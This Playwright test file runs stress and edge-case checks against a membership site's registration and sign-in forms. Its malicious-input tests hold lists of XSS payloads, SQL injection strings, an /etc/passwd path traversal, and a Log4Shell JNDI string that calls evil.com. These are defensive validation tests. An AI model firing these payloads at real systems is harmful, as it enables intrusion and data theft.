import { test, expect } from '@playwright/test'
import { HomePage } from '../pages/HomePage'
import { RegistrationPage } from '../pages/RegistrationPage'
import { SignInPage } from '../pages/SignInPage'
import { MemberDashboardPage } from '../pages/MemberDashboardPage'
import { TestHelpers } from '../utils/test-helpers'

test.describe('Edge Cases and Stress Testing', () => {
  test('should handle memory stress conditions', async ({ page }) => {
    const homePage = new HomePage(page)
    
    await test.step('Test memory-intensive operations', async () => {
      await homePage.goto()
      
      // Create memory pressure
      await page.evaluate(() => {
        const largeArrays: number[][] = []
        
        // Create multiple large arrays to consume memory
        for (let i = 0; i < 100; i++) {
          const largeArray = new Array(10000).fill(0).map((_, index) => index * Math.random())
          largeArrays.push(largeArray)
        }
        
        // Store in global to prevent garbage collection
        (window as any).memoryStressTest = largeArrays
        
        return largeArrays.length
      })
      
      // Test that page still functions under memory pressure
      await expect(homePage.heroTitle).toBeVisible()
      await expect(homePage.becomeMemberButton).toBeVisible()
      
      // Test navigation still works
      await homePage.becomeMemberButton.click()
      await page.waitForTimeout(2000)
      
      const currentUrl = page.url()
      expect(currentUrl).toContain('/auth/register')
      
      console.log('Memory stress test passed')
    })

    await test.step('Test memory leak detection', async () => {
      const initialMemory = await page.evaluate(() => {
        // @ts-ignore
        return (performance as any).memory ? 
          // @ts-ignore
          (performance as any).memory.usedJSHeapSize : 0
      })
      
      // Perform multiple page navigations
      for (let i = 0; i < 10; i++) {
        await homePage.goto()
        await homePage.scrollThroughSections()
        
        // Create and destroy DOM elements
        await page.evaluate(() => {
          const container = document.createElement('div')
          for (let j = 0; j < 1000; j++) {
            const element = document.createElement('div')
            element.textContent = `Test element ${j}`
            container.appendChild(element)
          }
          document.body.appendChild(container)
          
          // Remove after brief delay
          setTimeout(() => {
            document.body.removeChild(container)
          }, 100)
        })
        
        await page.waitForTimeout(200)
      }
      
      // Force garbage collection if available
      await page.evaluate(() => {
        if ((window as any).gc) {
          (window as any).gc()
        }
      })
      
      const finalMemory = await page.evaluate(() => {
        // @ts-ignore
        return (performance as any).memory ? 
          // @ts-ignore
          (performance as any).memory.usedJSHeapSize : 0
      })
      
      const memoryIncrease = finalMemory - initialMemory
      console.log(`Memory increase after stress test: ${memoryIncrease} bytes`)
      
      // Memory shouldn't grow excessively (allow 20MB increase)
      expect(memoryIncrease).toBeLessThan(20 * 1024 * 1024)
    })
  })

  test('should handle extreme input values', async ({ page }) => {
    const registrationPage = new RegistrationPage(page)
    
    await test.step('Test extremely long input values', async () => {
      await registrationPage.goto()
      
      const extremelyLongText = 'a'.repeat(10000)
      const extremelyLongEmail = 'a'.repeat(100) + '@' + 'b'.repeat(100) + '.com'
      
      // Test form handles extreme inputs gracefully
      await registrationPage.firstNameInput.fill(extremelyLongText)
      await registrationPage.emailInput.fill(extremelyLongEmail)
      await registrationPage.companyInput.fill(extremelyLongText)
      
      // Page should still be responsive
      await expect(registrationPage.firstNameInput).toBeVisible()
      await expect(registrationPage.nextButton).toBeEnabled()
      
      // Try to submit
      await registrationPage.nextButton.click()
      await page.waitForTimeout(2000)
      
      // Should handle gracefully (either validation or processing)
      const pageStillFunctional = await page.title()
      expect(pageStillFunctional).toBeTruthy()
      
      console.log('Extreme input values handled gracefully')
    })

    await test.step('Test special characters and Unicode', async () => {
      const specialCharacters = [
        '!@#$%^&*()_+-=[]{}|;:,.<>?',
        '汉字测试中文输入',
        'тест кириллицы',
        '🚀🌟💻🎯🔥',
        'ñáéíóúü',
        'محتوى عربي',
        '<script>alert("xss")</script>',
        'DROP TABLE users;',
        '../../../../etc/passwd',
        '{{7*7}}',
        '${jndi:ldap://evil.com/x}'
      ]
      
      for (const specialText of specialCharacters) {
        await registrationPage.firstNameInput.fill(specialText)
        await registrationPage.emailInput.fill(`test${Math.random()}@example.com`)
        await registrationPage.companyInput.fill(specialText)
        
        // Page should remain stable
        await expect(registrationPage.firstNameInput).toBeVisible()
        
        // Clear for next test
        await registrationPage.firstNameInput.fill('')
        await registrationPage.companyInput.fill('')
      }
      
      console.log('Special characters and Unicode handled safely')
    })

    await test.step('Test boundary values', async () => {
      const boundaryTests = [
        { field: 'phone', values: ['', '1', '12345678901234567890'] },
        { field: 'zip', values: ['', '1', '123456789012345'] },
        { field: 'yearsExperience', values: ['0', '-1', '999', 'abc'] }
      ]
      
      for (const { field, values } of boundaryTests) {
        for (const value of values) {
          const inputElement = page.locator(`input[name="${field}"]`)
          
          if (await inputElement.count() > 0) {
            await inputElement.fill(value)
            await inputElement.blur()
            await page.waitForTimeout(300)
            
            // Form should handle boundary values gracefully
            const formStillVisible = await registrationPage.nextButton.isVisible()
            expect(formStillVisible).toBeTruthy()
          }
        }
      }
      
      console.log('Boundary values handled correctly')
    })
  })

  test('should handle rapid user interactions', async ({ page }) => {
    const homePage = new HomePage(page)
    
    await test.step('Test rapid clicking', async () => {
      await homePage.goto()
      await homePage.waitForHeroToLoad()
      
      // Rapidly click the CTA button
      for (let i = 0; i < 20; i++) {
        await homePage.becomeMemberButton.click()
        await page.waitForTimeout(50) // Very short delay
      }
      
      // Page should handle rapid clicks gracefully
      await page.waitForTimeout(2000)
      
      // Should either be on registration page or handle gracefully
      const pageTitle = await page.title()
      expect(pageTitle).toBeTruthy()
      
      console.log('Rapid clicking handled gracefully')
    })

    await test.step('Test keyboard mashing', async () => {
      const signInPage = new SignInPage(page)
      await signInPage.goto()
      
      // Rapidly type in input fields
      const rapidText = 'abcdefghijklmnopqrstuvwxyz123456789'
      
      for (const char of rapidText) {
        await signInPage.emailInput.type(char, { delay: 10 })
      }
      
      // Form should remain responsive
      await expect(signInPage.emailInput).toBeVisible()
      await expect(signInPage.passwordInput).toBeVisible()
      
      console.log('Rapid keyboard input handled correctly')
    })

    await test.step('Test simultaneous form interactions', async () => {
      const registrationPage = new RegistrationPage(page)
      await registrationPage.goto()
      
      // Simultaneously interact with multiple form elements
      const interactions = [
        async () => await registrationPage.firstNameInput.fill('Test'),
        async () => await registrationPage.lastNameInput.fill('User'),
        async () => await registrationPage.emailInput.fill('test@example.com'),
        async () => await registrationPage.phoneInput.fill('5551234567'),
        async () => await registrationPage.companyInput.fill('Test Company')
      ]
      
      // Execute all interactions simultaneously
      await Promise.all(interactions.map(interaction => interaction()))
      
      // Form should handle concurrent updates
      await expect(registrationPage.nextButton).toBeVisible()
      
      console.log('Simultaneous interactions handled correctly')
    })
  })

  test('should handle network stress conditions', async ({ page }) => {
    const homePage = new HomePage(page)
    
    await test.step('Test intermittent network failures', async () => {
      let requestCount = 0
      
      await page.route('**/*', (route) => {
        requestCount++
        
        // Randomly fail 30% of requests
        if (Math.random() < 0.3) {
          route.abort('internetdisconnected')
        } else {
          route.continue()
        }
      })
      
      await homePage.goto()
      await page.waitForTimeout(5000)
      
      // Page should still be functional despite network issues
      const pageContent = await page.textContent('body')
      expect(pageContent).toBeTruthy()
      
      console.log(`Network stress test: ${requestCount} requests processed`)
    })

    await test.step('Test slow network simulation', async () => {
      // Simulate very slow network (0.5 Mbps)
      await TestHelpers.simulateSlowNetwork(page)
      
      const startTime = Date.now()
      await homePage.goto()
      await homePage.waitForHeroToLoad()
      
      const loadTime = Date.now() - startTime
      console.log(`Slow network load time: ${loadTime}ms`)
      
      // Should eventually load even on slow network
      await expect(homePage.heroTitle).toBeVisible()
      
      // Restore normal network
      await TestHelpers.restoreNetworkConditions(page)
    })

    await test.step('Test network timeout scenarios', async () => {
      await page.route('**/api/**', async (route) => {
        // Delay API responses significantly
        await page.waitForTimeout(10000)
        route.continue()
      })
      
      const signInPage = new SignInPage(page)
      await signInPage.goto()
      
      // Try to sign in with delayed API
      await signInPage.signIn('test@example.com', 'password123')
      await page.waitForTimeout(3000) // Don't wait full timeout
      
      // Page should handle timeout gracefully
      const pageStillResponsive = await signInPage.signInButton.isVisible()
      expect(pageStillResponsive).toBeTruthy()
      
      console.log('Network timeout handled gracefully')
    })
  })

  test('should handle browser resource limitations', async ({ page }) => {
    const memberDashboard = new MemberDashboardPage(page)
    
    await test.step('Test with limited storage', async () => {
      // Fill up localStorage
      await page.evaluate(() => {
        try {
          for (let i = 0; i < 1000; i++) {
            const largeString = 'x'.repeat(10000)
            localStorage.setItem(`test-${i}`, largeString)
          }
        } catch (e) {
          console.log('Storage quota exceeded:', e)
        }
      })
      
      // App should still function with limited storage
      await TestHelpers.authenticateAsMember(page)
      await memberDashboard.goto()
      
      await expect(memberDashboard.welcomeTitle).toBeVisible()
      
      console.log('Limited storage scenario handled')
    })

    await test.step('Test with disabled cookies', async () => {
      const context = page.context()
      
      // Clear all cookies and prevent new ones
      await context.clearCookies()
      
      await page.route('**/*', (route) => {
        route.continue({
          headers: {
            ...route.request().headers(),
            'Set-Cookie': '' // Remove set-cookie headers
          }
        })
      })
      
      const homePage = new HomePage(page)
      await homePage.goto()
      
      // Basic functionality should work without cookies
      await expect(homePage.heroTitle).toBeVisible()
      
      console.log('No-cookies scenario handled')
    })

    await test.step('Test with limited viewport', async () => {
      // Test extremely small viewport
      await page.setViewportSize({ width: 240, height: 320 })
      
      const homePage = new HomePage(page)
      await homePage.goto()
      await homePage.waitForHeroToLoad()
      
      // Content should be accessible even on tiny screens
      await expect(homePage.heroTitle).toBeVisible()
      
      // Test navigation still works
      const navElements = await page.locator('nav button, .mobile-menu-toggle').count()
      
      if (navElements > 0) {
        console.log('Mobile navigation available on small viewport')
      }
      
      console.log('Extremely small viewport handled')
    })
  })

  test('should handle concurrent user scenarios', async ({ page, context }) => {
    await test.step('Test multiple tabs with same user', async () => {
      // Create multiple tabs
      const pages = await Promise.all([
        context.newPage(),
        context.newPage(),
        context.newPage()
      ])
      
      // Authenticate in all tabs
      for (const tabPage of pages) {
        await TestHelpers.authenticateAsMember(tabPage)
      }
      
      // Navigate to dashboard in all tabs
      const dashboards = pages.map(p => new MemberDashboardPage(p))
      
      await Promise.all(
        dashboards.map(async (dashboard) => {
          await dashboard.goto()
          await dashboard.waitForDashboardLoad()
        })
      )
      
      // All dashboards should load correctly
      for (const dashboard of dashboards) {
        await expect(dashboard.welcomeTitle).toBeVisible()
      }
      
      // Test interactions in multiple tabs
      await Promise.all(
        dashboards.map(async (dashboard, index) => {
          if (dashboard.statCards && await dashboard.statCards.count() > index) {
            await dashboard.clickStatCard(index)
          }
        })
      )
      
      console.log('Multiple tabs scenario handled')
      
      // Clean up
      await Promise.all(pages.map(p => p.close()))
    })

    await test.step('Test rapid session switching', async () => {
      const signInPage = new SignInPage(page)
      
      // Rapidly switch between authenticated and unauthenticated states
      for (let i = 0; i < 5; i++) {
        // Sign in
        await TestHelpers.authenticateAsMember(page)
        
        // Sign out (simulate by clearing session)
        await TestHelpers.clearUserSession(context)
        
        // Try to access protected page
        await page.goto('/member/dashboard')
        await page.waitForTimeout(1000)
        
        // Should redirect to sign in or handle gracefully
        const currentUrl = page.url()
        const handledGracefully = currentUrl.includes('/auth/signin') || 
                                 currentUrl.includes('/login') ||
                                 await page.locator('text=Sign in, text=Login').count() > 0
        
        expect(handledGracefully).toBeTruthy()
      }
      
      console.log('Rapid session switching handled')
    })
  })

  test('should handle malicious input attempts', async ({ page }) => {
    const registrationPage = new RegistrationPage(page)
    
    await test.step('Test XSS prevention', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '\'-alert(String.fromCharCode(88,83,83))-\'',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>'
      ]
      
      const alerts: string[] = []
      page.on('dialog', (dialog) => {
        alerts.push(dialog.message())
        dialog.dismiss()
      })
      
      await registrationPage.goto()
      
      for (const payload of xssPayloads) {
        await registrationPage.firstNameInput.fill(payload)
        await registrationPage.emailInput.fill(`test${Math.random()}@example.com`)
        await registrationPage.companyInput.fill(payload)
        
        await registrationPage.nextButton.click()
        await page.waitForTimeout(1000)
        
        // Clear for next test
        await registrationPage.firstNameInput.fill('')
        await registrationPage.companyInput.fill('')
      }
      
      // No XSS should have executed
      expect(alerts.length).toBe(0)
      
      console.log('XSS prevention working correctly')
    })

    await test.step('Test SQL injection attempts', async () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "admin'/*",
        "' UNION SELECT * FROM users --",
        "1' AND 1=1--",
        "' OR 1=1#"
      ]
      
      const signInPage = new SignInPage(page)
      await signInPage.goto()
      
      for (const payload of sqlPayloads) {
        await signInPage.emailInput.fill(payload)
        await signInPage.passwordInput.fill(payload)
        
        await signInPage.signInButton.click()
        await page.waitForTimeout(2000)
        
        // Should not succeed with SQL injection
        const currentUrl = page.url()
        const notAuthenticated = currentUrl.includes('/auth/signin') ||
                               await page.locator('.text-red-500, [role="alert"]').count() > 0
        
        expect(notAuthenticated).toBeTruthy()
        
        // Clear for next test
        await signInPage.emailInput.fill('')
        await signInPage.passwordInput.fill('')
      }
      
      console.log('SQL injection prevention working')
    })

    await test.step('Test CSRF protection', async () => {
      // Test direct form submission without proper tokens
      await registrationPage.goto()
      
      // Try to submit form via direct POST
      const response = await page.evaluate(async () => {
        try {
          const formData = new FormData()
          formData.append('firstName', 'Test')
          formData.append('email', 'test@example.com')
          
          const response = await fetch('/api/auth/register', {
            method: 'POST',
            body: formData
          })
          
          return {
            status: response.status,
            ok: response.ok
          }
        } catch (error) {
          return {
            error: error.message
          }
        }
      })
      
      // Should be rejected without proper CSRF token
      expect(response.status === 403 || response.status === 400 || response.error).toBeTruthy()
      
      console.log('CSRF protection active')
    })
  })

  test('should handle edge case user flows', async ({ page }) => {
    await test.step('Test back button during registration', async () => {
      const registrationPage = new RegistrationPage(page)
      const testUserData = TestHelpers.generateTestUser()
      
      await registrationPage.goto()
      await registrationPage.fillStep1(testUserData.step1)
      await registrationPage.clickNext()
      
      // Use browser back button in middle of registration
      await page.goBack()
      await page.waitForTimeout(1000)
      
      // Should handle gracefully
      const pageStillFunctional = await page.title()
      expect(pageStillFunctional).toBeTruthy()
      
      console.log('Back button during registration handled')
    })

    await test.step('Test page reload during form submission', async () => {
      const signInPage = new SignInPage(page)
      await signInPage.goto()
      
      await signInPage.emailInput.fill('test@example.com')
      await signInPage.passwordInput.fill('password123')
      
      // Click submit and immediately reload
      await signInPage.signInButton.click()
      await page.reload()
      
      // Should return to clean state
      await expect(signInPage.emailInput).toHaveValue('')
      await expect(signInPage.passwordInput).toHaveValue('')
      
      console.log('Page reload during submission handled')
    })

    await test.step('Test duplicate form submission', async () => {
      const signInPage = new SignInPage(page)
      await signInPage.goto()
      
      await signInPage.emailInput.fill('member@namc-norcal.org')
      await signInPage.passwordInput.fill('member123')
      
      // Submit form multiple times rapidly
      const promises = [
        signInPage.signInButton.click(),
        signInPage.signInButton.click(),
        signInPage.signInButton.click()
      ]
      
      await Promise.all(promises)
      await page.waitForTimeout(3000)
      
      // Should handle duplicate submissions gracefully
      const pageTitle = await page.title()
      expect(pageTitle).toBeTruthy()
      
      console.log('Duplicate form submission handled')
    })
  })

  test.afterEach(async ({ page, context }) => {
    // Clean up any test modifications
    await page.evaluate(() => {
      try {
        localStorage.clear()
        sessionStorage.clear()
        
        // Clean up any global test objects
        if ((window as any).memoryStressTest) {
          delete (window as any).memoryStressTest
        }
      } catch (e) {
        console.log('Cleanup error:', e)
      }
    })
    
    await TestHelpers.clearUserSession(context)
    
    // Take screenshot on failure
    if (test.info().status !== test.info().expectedStatus) {
      await TestHelpers.takeTimestampedScreenshot(page, 'stress-test-failure')
    }
  })
})